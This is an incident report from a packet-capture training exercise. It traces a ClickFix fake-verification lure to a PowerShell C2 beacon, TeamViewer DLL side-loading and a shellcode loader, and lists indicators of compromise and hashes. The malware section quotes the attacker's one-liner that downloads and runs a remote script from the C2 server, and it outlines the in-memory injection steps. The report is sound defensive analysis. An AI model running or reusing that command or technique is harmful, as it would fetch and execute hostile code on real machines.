# Incident Report — MTA 2025-01-22 Traffic Analysis Exercise

**Evidence reviewed:** `2025-01-22-traffic-analysis-exercise.pcap` (39,427 packets, 2025-01-22 23:44:56 – 2025-01-23 00:38:18, local capture time). No IDS/Suricata alert exports were present in the evidence directory; findings below are derived entirely from packet-level analysis with tshark.

## Victim Host

| Attribute | Value |
|---|---|
| IPv4 address | 10.1.17.215 |
| MAC address | 00:d0:b7:26:4a:74 |
| Windows hostname | DESKTOP-L8C5GSJ (AD domain: bluemoontuesday.com, NetBIOS workgroup/domain BLUEMOONTUESDAY) |
| Logged-in Windows user | shutchenson (confirmed via Kerberos AS-REQ CNameString from 10.1.17.215) |

Confirmed via DHCP request (option 12 hostname = DESKTOP-L8C5GSJ, chaddr = 00:d0:b7:26:4a:74), ARP (10.1.17.215 → 00:d0:b7:26:4a:74), and NBNS name registrations.

## Malware Family

**Behavioral attribution only — not signature-confirmed** (no AV/IDS detections in the evidence set). The traffic matches a **ClickFix-style fake-CAPTCHA/verification lure that delivers a generic PowerShell RAT/loader with TeamViewer DLL side-loading persistence**. No unique family name/signature could be confirmed offline; the closest publicly-recognized pattern this fits is the "ClickFix → PowerShell RAT → TeamViewer sideload" technique. Behavior observed and extracted directly from the pcap:

1. Victim browses `google-authenticator.burleson-appliance.net` then `authenticatoor.org` (fake CAPTCHA/"verify you are human" ClickFix lure), then `appointedtimeagriculture.com` — all within ~15 seconds (23:45:34–23:45:49).
2. A `.wsc`/HTA-style VBScript component (`http://5.252.153.241/api/file/get-file/264872`) launches a hidden PowerShell command via `Wscript.Shell.Run`, decoy-opening `azure.microsoft.com`/`teams.microsoft.com` while silently running:
   `iex (New-Object Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1')`
3. `29842.ps1` (obfuscated Base64/PowerShell) computes the C volume serial number as a bot ID (**1517096937**) and enters an infinite loop polling `http://5.252.153.241/1517096937` every 5 seconds via `DownloadString`, executing whatever is returned with `Invoke-Expression`. This is the observed repeating `GET /1517096937` beacon traffic (hundreds of requests, 23:45:58 through end of capture).
4. First C2 command retrieved (`Invoke-Startup`) downloads and drops into `C:\ProgramData\huo\`: `TeamViewer.exe`, `Teamviewer_Resource_fr.dll`, `TV.dll`, and `pas.ps1` — a TeamViewer DLL side-loading kit for remote-hands-on-keyboard access — then creates a Startup-folder shortcut (`TeamViewer.lnk` → `C:\ProgramData\huo\TeamViewer.exe`) for persistence. Result logged back to C2 as `message = startup shortcut created; status = success`.
5. Repeated follow-on C2 command (`RunRH`) drops a second heavily obfuscated PowerShell script `C:\ProgramData\jsLeow\skqllz.ps1` that Base64-decodes an embedded payload, calls `VirtualAlloc` with executable protection, copies the payload into memory via `Marshal.Copy`, and executes it via `CallWindowProcW` — a classic in-memory shellcode-injection loader. Result logged as `script: RunRH, status: OK, message: PS process started`.
6. Genuine TeamViewer infrastructure traffic (`master16.teamviewer.com`, `ping3.dyngate.com`) followed, consistent with the sideloaded TeamViewer being used for live remote access to the infected host.

## Indicators of Compromise

**Command-and-control:**
- 5.252.153.241:80 (HTTP, plaintext) — primary C2; two long-lived TCP sessions from 10.1.17.215:50144 and :49689, ~5.4 MB and ~1.4 MB of traffic respectively, spanning nearly the entire capture.

**Malicious domains (ClickFix lure chain, resolved via DNS in the capture):**
- `google-authenticator.burleson-appliance.net` → 104.21.x.x (Cloudflare-fronted)
- `authenticatoor.org` → 82.221.136.26
- `appointedtimeagriculture.com` → 217.70.186.109

**Malicious URLs (all to 5.252.153.241):**
- `http://5.252.153.241/api/file/get-file/264872` — initial VBScript/HTA dropper
- `http://5.252.153.241/api/file/get-file/29842.ps1` — PowerShell C2 beacon loader
- `http://5.252.153.241/api/file/get-file/pas.ps1` — duplicate beacon loader (identical logic to 29842.ps1)
- `http://5.252.153.241/api/file/get-file/TeamViewer` — legit TeamViewer.exe (repurposed for sideloading)
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr` — malicious sideload DLL
- `http://5.252.153.241/api/file/get-file/TV` — malicious sideload DLL
- `http://5.252.153.241/1517096937` — bot-ID-keyed C2 polling/beacon endpoint (repeated GET, 5s interval)
- `http://5.252.153.241/1517096937?k=...` — result/status exfil callbacks (e.g. `message = startup shortcut created; status = success`; `script: RunRH, status: OK, message: PS process started`)

**Transferred files and SHA256 hashes (extracted from HTTP objects in the pcap):**

| File name | SHA256 | Purpose |
|---|---|---|
| 264872 | c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103 | VBScript/HTA dropper (launches hidden PowerShell) |
| 29842.ps1 | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded | Obfuscated PowerShell C2 beacon/poller |
| pas.ps1 | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e | Duplicate of the C2 beacon/poller |
| TeamViewer (→ TeamViewer.exe) | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e | Legitimate TeamViewer binary, abused for DLL side-loading |
| Teamviewer_Resource_fr (→ .dll) | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 | Sideloaded malicious/companion DLL |
| TV (→ TV.dll) | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 | Sideloaded malicious DLL (stripped PE) |

**On-disk artifacts (from decoded C2 command scripts, not directly observed as separate downloads but written by the beacon):**
- `C:\ProgramData\huo\TeamViewer.exe`, `Teamviewer_Resource_fr.dll`, `TV.dll`, `pas.ps1`
- `%APPDATA%\...\Startup\TeamViewer.lnk` (persistence shortcut)
- `C:\ProgramData\jsLeow\skqllz.ps1` (in-memory shellcode loader)

## Summary

Host DESKTOP-L8C5GSJ (10.1.17.215, user shutchenson) was compromised via a fake-verification/ClickFix web lure that tricked the user into executing a hidden PowerShell one-liner. This established a persistent HTTP C2 beacon to 5.252.153.241, which was used to deploy a side-loaded TeamViewer remote-access kit for persistence/hands-on-keyboard access and to push an in-memory shellcode loader. Recommend isolating the host immediately, resetting the shutchenson account credentials, and hunting the environment for the listed file hashes and the C2 IP.
